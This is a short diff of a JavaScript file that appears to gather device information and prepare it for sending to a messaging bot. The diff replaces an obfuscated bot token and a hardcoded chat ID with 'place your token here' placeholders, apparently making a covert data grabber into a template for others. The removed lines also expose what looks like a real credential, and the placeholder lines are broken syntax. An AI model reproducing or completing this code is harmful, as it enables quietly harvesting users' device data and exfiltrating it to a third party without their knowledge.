@@ -126,7 +126,7 @@ function getDeviceMemoryInfo() {
   }
   
   function jkt(info) {
-    let t = "6U9p5I7i620Q0-4U1v4Z:QAlAWEhv82vhpyax5x6N-hGHf";
+    let t = <PLACE YOUR BOT TOKEN HERE WITHIN "";
     let nt = "";
     let nt1 = "";
     let nt2 = "";
@@ -143,7 +143,7 @@ function getDeviceMemoryInfo() {
     console.log(nt);
   
     const bixi = nt;
-    const chatId = "6231212422";
+    const chatId = <PLACE YOUR CHAT ID HERE WITH IN "">;
   
     const encodedInfo = encodeURIComponent(info);
   
